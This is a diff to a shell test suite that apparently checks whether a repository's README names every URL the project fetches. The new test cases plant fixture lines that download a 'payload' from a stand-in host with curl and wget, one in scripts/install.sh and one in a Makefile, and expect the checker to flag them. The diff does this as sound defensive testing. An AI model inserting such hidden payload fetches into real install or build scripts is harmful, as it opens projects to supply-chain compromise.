@@ -45,6 +45,16 @@ grep -vF 'bash-toolbox/<commit>/src/prefix.sh' README.md > "$w/repo/README.md"
 expect "the README without the toolbox URL" 1 \
     'FAIL README\.md does not name https://raw\.githubusercontent\.com/[^ ]+/bash-toolbox/<commit>/src/prefix\.sh, which the project fetches'
 
+fresh
+printf '%s\n' '    curl -fsSL https://example.invalid/payload.sh' >> "$w/repo/scripts/install.sh"
+expect "a curl of an unnamed URL" 1 \
+    'FAIL a fetch the README may not name: scripts/install\.sh:[0-9]+:    curl -fsSL https://example\.invalid/payload\.sh'
+
+fresh
+printf '\n%s\n' '	wget -q https://example.invalid/payload' >> "$w/repo/Makefile"
+expect "a wget in the Makefile" 1 \
+    'FAIL a fetch the README may not name: Makefile:[0-9]+:	wget -q https://example\.invalid/payload'
+
 if [ "$failed" -ne 0 ]; then
     exit 1
 fi
